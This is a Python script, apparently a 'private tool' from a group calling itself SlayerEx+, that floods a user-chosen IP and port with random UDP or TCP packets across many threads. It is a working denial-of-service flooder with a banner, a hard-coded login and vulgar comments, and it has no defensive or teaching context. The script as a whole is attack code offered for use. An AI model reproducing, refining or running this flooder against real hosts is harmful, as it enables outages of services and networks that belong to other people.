#ga usah rename anj
#kontol yang rename
import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[1;31;40m")
os.system("clear")
print("""\033[93m
\033[93m
 █████                          ███
░░███                          ░░░
 ░███         ██████   ███████ ████  ████████
 ░███        ███░░███ ███░░███░░███ ░░███░░███
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███
 ███████████░░██████ ░░███████ █████ ████ █████
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░
                      ███ ░███
                     ░░██████
                      ░░░░░░
             \033[93m>> \033[96mPrivate Tools By Gada Lu Bau#8688 \033[93m<<
            \033[97m
   ███
  █   █
\033[97m  █   █                      \033[93m Dosen't have account? DM Gada Lu Bau#8688
\033[97m█████████               ██   \033[93m Or You Can Just Join Our Discord Server, Link??
\033[97m█████████              █  █  \033[93m https://dsc.gg/pornhub \033[97m
\033[97m███   ███ ██████████████  █
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m

""")
username = str(input("\033[33m[GadaLuBau] \033[93mUsername:"))
password = str(input("\033[33m[GadaLuBau] \033[93mPassword:"))
if password == "SlayerEx+" and username == "ApasihKids":
    print ("Logged in as admin")
    time.sleep(2)

else:
    print ("Incorrect Password. Please try again.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("""
  ____           _         _            ____
 / ___| __ _  __| | __ _  | |   _   _  | __ )  __ _ _   _
| |  _ / _` |/ _` |/ _` | | |  | | | | |  _ \ / _` | | | | [+] Author  : Gada Lu Bau#8688
| |_| | (_| | (_| | (_| | | |__| |_| | | |_) | (_| | |_| | [+] Youtube : Gada Lu Bau
 \____|\__,_|\__,_|\__,_| |_____\__,_| |____/ \__,_|\__,_| [+] Team    : SlayerEx+
""")
print("""\033[1;36;40m
___________________________________________

[•] METHODS UDP / TCP TOOLS
[•] TOOLS FOR MEMBER
[•] Subscribe Yt Gada Lu Bau
[•] Kalo Mau Rename Izin Ke Author Dulu
___________________________________________
""")

ip = str(input("\033[1;36;40m[+] IP : \033[1;31;40m"))
port = int(input("\033[1;36;40m[+] PORT : \033[1;31;40m"))
choice = str(input("\033[1;36;40m[+] METHODS : \033[1;31;40m"))
times = int(input("\033[1;36;40m[+] PACKETS : \033[1;31;40m"))
threads = int(input("\033[1;36;40m[+] THREADS : \033[1;31;40m"))

os.system("clear")
def run():

	data = random._urandom(1050)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print("\033[1;36;40mSlayerEx Attack %s Port %s"%(ip,port))

		except:

			print("Down!!!")



def run2():

	data = random._urandom(102498)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print("\033[1;36;40mSlayerEx Attack %s Port %s"%(ip,port))

		except:

			s.close()

			print("Down!!")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = run2)
        th.start()
